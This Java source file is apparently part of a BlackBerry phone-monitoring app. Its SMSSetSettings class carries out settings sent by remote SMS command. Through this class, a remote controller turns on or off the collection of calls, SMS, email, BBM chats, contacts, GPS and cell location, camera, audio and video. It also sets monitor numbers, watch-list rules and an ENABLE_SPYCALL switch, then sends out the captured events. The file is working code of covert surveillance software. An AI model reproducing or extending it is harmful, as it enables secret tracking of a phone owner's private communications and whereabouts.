package com.vvt.rmtcmd.sms;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefAddressBook;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefPIN;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.EdFlag;
import com.vvt.rmtcmd.NumberCmdLine;
import com.vvt.rmtcmd.SetSettingCode;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.SetSettingsCmdLine;
import com.vvt.rmtcmd.command.SetWatchFlagsCmd;
import com.vvt.rmtcmd.command.WatchFlags;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSSetSettings extends RmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSSetSettings(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}

	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		
//		Log.debug("SMSSetSettings", "ENTER");
		
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getSettingCmd());
		try {
			Preference pref = Global.getPreference();
			SetSettingsCmdLine settingsCmdLine = (SetSettingsCmdLine) rmtCmdLine;
			Hashtable defaultSetting = settingsCmdLine.getDefaultSetting();
			Enumeration e = defaultSetting.keys();
			while (e.hasMoreElements()) {
				SetSettingCode rmtCmdKey = (SetSettingCode) e.nextElement();
				if (rmtCmdKey.getId() == SetSettingCode.AUDIO_RECORD.getId()) {
					PrefAudioFile prefAudio = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						prefAudio.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						prefAudio.setEnabled(true);
					}
					pref.commit(prefAudio);
				} else if (rmtCmdKey.getId() == SetSettingCode.CALL.getId()) {
					PrefEventInfo eventInfo = (PrefEventInfo) pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						eventInfo.setCallLogEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						eventInfo.setCallLogEnabled(true);
					}
					pref.commit(eventInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.CAMERA_IMAGE.getId()) {
					PrefCameraImage prefImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						prefImage.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						prefImage.setEnabled(true);
					}
					pref.commit(prefImage);
				} else if (rmtCmdKey.getId() == SetSettingCode.CAPTURE_TIMER.getId()) {
					PrefGeneral captureTimerInfo = (PrefGeneral) pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					int timerInSeconds = value.intValue() * (60 * 60);
					for (int i = 0; i < ApplicationInfo.TIME_VALUE.length; i++) {
						if (timerInSeconds == ApplicationInfo.TIME_VALUE[i]) {
							captureTimerInfo.setSendTimeIndex(i);
							break;
						}
					}
					pref.commit(captureTimerInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.CONTACT.getId()) {
					PrefAddressBook addrBookInfo = (PrefAddressBook) pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						addrBookInfo.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						addrBookInfo.setEnabled(true);
					}
					pref.commit(addrBookInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.EVENT_COUNT.getId()) {
					PrefGeneral eventCountInfo = (PrefGeneral) pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					eventCountInfo.setMaxEventCount(value.intValue());
					pref.commit(eventCountInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.GPS.getId()) {
					PrefGPS gpsInfo = (PrefGPS) pref.getPrefInfo(PreferenceType.PREF_GPS);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						gpsInfo.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						gpsInfo.setEnabled(true);
					}
					pref.commit(gpsInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.GPS_TIMER.getId()) {
					PrefGPS gpsTimerInfo = (PrefGPS) pref.getPrefInfo(PreferenceType.PREF_GPS);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					int index = value.intValue();
					if (index > 0) {
						GPSOption option = gpsTimerInfo.getGpsOption();
						option.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index - 1]);
						gpsTimerInfo.setGpsOption(option);
					}
					pref.commit(gpsTimerInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.IM.getId()) {
					PrefMessenger messengerInfo = (PrefMessenger) pref.getPrefInfo(PreferenceType.PREF_IM);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						messengerInfo.setBBMEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						messengerInfo.setBBMEnabled(true);
					}
					pref.commit(messengerInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.LOCATION.getId()) {
					PrefCellInfo cellInfo = (PrefCellInfo) pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						cellInfo.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						cellInfo.setEnabled(true);
					}
					pref.commit(cellInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.MAIL.getId()) {
					PrefEventInfo emailInfo = (PrefEventInfo) pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						emailInfo.setEmailEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						emailInfo.setEmailEnabled(true);
					}
					pref.commit(emailInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.PIN.getId()) {
					PrefPIN pinInfo = (PrefPIN) pref.getPrefInfo(PreferenceType.PREF_PIN);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						pinInfo.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						pinInfo.setEnabled(true);
					}
					pref.commit(pinInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.SMS.getId()) {
					PrefEventInfo smsInfo = (PrefEventInfo) pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						smsInfo.setSMSEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						smsInfo.setSMSEnabled(true);
					}
					pref.commit(smsInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.START_STOP_CAPTURE.getId()) {
					PrefGeneral startStopInfo = (PrefGeneral) pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						startStopInfo.setCaptured(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						startStopInfo.setCaptured(true);
					}
					pref.commit(startStopInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.VIDEO_FILE.getId()) {
					PrefVideoFile prefVideo = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						prefVideo.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						prefVideo.setEnabled(true);
					}
					pref.commit(prefVideo);
				} else if (rmtCmdKey.getId() == SetSettingCode.HOME_IN.getId()) {
					/*clearHomeInNumberDB();
					Vector value = (Vector) defaultSetting.get(rmtCmdKey);
					NumberCmdLine homeIn = (NumberCmdLine) rmtCmdLine;
					homeIn.setNumberStore(value);
					addHomeInNumberDB();*/
					// TODO: Home IN in term of sever side but it's home OUT in client so use the same logic as home OUT
					clearHomeOutNumberDB();
					Vector value = (Vector) defaultSetting.get(rmtCmdKey);
					int countHomeOut = value.size();
					for (int i = 0; i < countHomeOut; i++) {
						String homeoutNumber = (String) value.elementAt(i);
						prefBugInfo.addHomeOutNumber(homeoutNumber);
					}
					pref.commit(prefBugInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.ENABLE_WATCH.getId()) {
					PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					
//					Log.debug("CmdSetSettings.execute().ENABLE_WATCH", "value: " + value.intValue());
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						watchListInfo.setWatchListEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						watchListInfo.setWatchListEnabled(true);
					}
					bugInfo.setPrefWatchListInfo(watchListInfo);
					pref.commit(bugInfo);					
				} else if (rmtCmdKey.getId() == SetSettingCode.SET_WATCH_FLAGS.getId()) {
					Vector value = (Vector) defaultSetting.get(rmtCmdKey);
					PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
					watchListInfo.setInAddrbookEnabled(false);
					if (value.elementAt(0).equals("1")) {
						watchListInfo.setInAddrbookEnabled(true);
					} 
					watchListInfo.setNotInAddrbookEnabled(false);
					if (value.elementAt(1).equals("1")) {
						watchListInfo.setNotInAddrbookEnabled(true);
					}
					watchListInfo.setInWatchListEnabled(false);
					if (value.elementAt(2).equals("1")) {
						watchListInfo.setInWatchListEnabled(true);
					}
					watchListInfo.setUnknownEnabled(false);
					if (value.elementAt(3).equals("1")) {
						watchListInfo.setUnknownEnabled(true);
					}
					bugInfo.setPrefWatchListInfo(watchListInfo);
					pref.commit(bugInfo);
				} else if (rmtCmdKey.getId() == SetSettingCode.MONITOR_NUMBER.getId()) {
					clearMonitorNumberDB();
					Vector value = (Vector) defaultSetting.get(rmtCmdKey);
					int countMonNum = value.size();
					
//					Log.debug("CmdSetSettings.MONITOR_NUMBER", "countMonNum: " + countMonNum);
					
					for (int i = 0; i < countMonNum; i++) {
						String monitorNumber = (String) value.elementAt(i);
						prefBugInfo.addMonitorNumber(monitorNumber);
//						Log.debug("CmdSetSettings.MONITOR_NUMBER", "monitorNumber: " + monitorNumber);
					}
					pref.commit(prefBugInfo);					
				} else if (rmtCmdKey.getId() == SetSettingCode.ENABLE_SPYCALL.getId()) {
					PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					if (value.intValue() == EdFlag.DISABLE.getId()) {
						bugInfo.setEnabled(false);
					} else if (value.intValue() == EdFlag.ENABLE.getId()) {
						bugInfo.setEnabled(true);
					}
					pref.commit(bugInfo);
				}
				/*else if (rmtCmdKey.getId() == SetSettingCode.PANIC_MODE.getId()) {
					PrefPanicInfo panicModeInfo = (PrefPanicInfo) pref.getPrefInfo(PreferenceType.PREF_PANIC_INFO);
					Integer value = (Integer) defaultSetting.get(rmtCmdKey);
					panicModeInfo.setPanicMode(value.intValue());	
					pref.commit(panicModeInfo);
				}*/
			}
			responseMessage.append(Constant.OK);
			if (rmtCmdLine.isDebugSerialIdMode()) {
				doSMSAppSetting();
			}
		} catch(Exception e) {
			super.result = Constant.ERROR;
			doSMSHeader(smsCmdCode.getSettingCmd());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdSetSettings.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
